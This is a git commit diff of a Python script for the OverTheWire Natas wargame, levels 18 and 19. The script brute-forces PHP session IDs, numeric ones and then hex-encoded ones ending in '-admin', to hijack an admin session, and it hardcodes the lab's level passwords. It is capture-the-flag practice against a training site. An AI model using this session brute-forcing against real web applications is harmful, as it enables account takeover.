6f2994d8b5633189795a1b25069b981e2b2143d7
JonasBK <jonas.bulow@hotmail.com>
2018-08-28 21:55:45 +0200

    Blind php session id updated.

--- src/blind_php_session_id.py
+++ src/blind_php_session_id.py
@@ -5,15 +5,30 @@ Created on Aug 22, 2018
 
 import requests
 from requests.auth import HTTPBasicAuth
+import sys
 
-for i in range(0, 641):    
-    my_data = {'username': 'admin', 'password': 'admin'}
-    cookie = {'PHPSESSID': '{0}'.format(i)}
-    r = requests.post("http://natas18.natas.labs.overthewire.org/index.php?debug", 
-                      data=my_data, 
-                      cookies=cookie,
-                      auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'))
+for i in range(0, 10):
+    n1 = "";
+    if i > 0: 
+        n1 = "3" + str(i)
+    for j in range(0, 10):
+        n2 = "";
+        if j > 0: 
+            n2 = "3" + str(j)
     
-    print(i)
-    if (i > 638 or "You are an admin" in r.text):
-        print(r.text)
+        for k in range(0, 10):
+            n3 = "";
+            if k > 0: 
+                n3 = "3" + str(k)
+            
+            my_data = {'username': 'admin', 'password': 'admin'}
+            cookie = {'PHPSESSID': '{0}{1}{2}2d61646d696e'.format(n1, n2, n3)}
+            r = requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug", 
+                              data=my_data, 
+                              cookies=cookie,
+                              auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'))
+            
+            print('{0}, {1}, {2}'.format(i, j, k))
+            if ("You are logged in as a regular user" not in r.text):
+                print(r.text)
+                sys.exit()
